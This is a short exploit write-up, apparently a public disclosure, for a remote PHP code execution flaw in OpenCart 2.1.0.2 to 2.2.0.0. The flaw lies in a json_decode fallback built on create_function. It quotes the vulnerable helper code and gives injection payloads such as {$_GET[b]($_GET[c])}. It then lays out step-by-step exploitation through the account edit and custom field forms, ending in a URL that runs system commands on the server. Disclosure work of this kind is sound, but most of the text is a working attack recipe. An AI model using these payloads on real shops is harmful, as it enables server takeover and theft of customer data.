@@ -1,0 +1,48 @@
+OpenCart json_decode function Remote PHP Code Execution
+
+Author: Naser Farhadi
+Twitter: @naserfarhadi
+
+Date: 9 April 2016 Version: 2.1.0.2 to 2.2.0.0 (Latest version)
+Vendor Homepage: http://www.opencart.com/
+
+Vulnerability:
+------------
+/upload/system/helper/json.php
+$match = '/".*?(?<!\\\\)"/';
+$string = preg_replace($match, '', $json);
+$string = preg_replace('/[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/', '', $string);
+...
+$function = @create_function('', "return {$json};"); /**** The Root of All Evil ****/
+$return = ($function) ? $function() : null;
+...
+return $return;
+
+Exploit(json_decode):
+------------
+var_dump(json_decode('{"ok":"{$_GET[b]($_GET[c])}"}'));
+var_dump(json_decode('{"ok":"$_SERVER[HTTP_USER_AGENT]"}'));
+var_dump(json_decode('{"ok":"1"."2"."3"}'));
+
+Real World Exploit(OpenCart /index.php?route=account/edit)
+------------
+go to http://host/shop_directory/index.php?route=account/edit
+fill $_SERVER[HTTP_USER_AGENT] as First Name
+/** save it two times **/
+Code execution happens when an admin user visits the administration panel, in this example 
+admin user sees his user agent as your First Name in Recent Activity :D
+
+Another example(OpenCart account/edit or account/register custom_field): /** Best Case **/
+------------
+if admin adds a Custom Field from /admin/index.php?route=customer/custom_field for custom
+user information like extra phone number,... you can directly execute your injected code.
+go to http://host/shop_directory/index.php?route=account/edit
+fill {$_GET[b]($_GET[c])} as Custom Field value
+save it
+go to http://host/shop_directory/index.php?route=account/edit&b=system&c=ls /** Mission Accomplished **/
+
+Note:
+------------
+Exploit only works if PHP JSON extension is not installed.
+
+Video: https://youtu.be/1Ai09IQK4C0
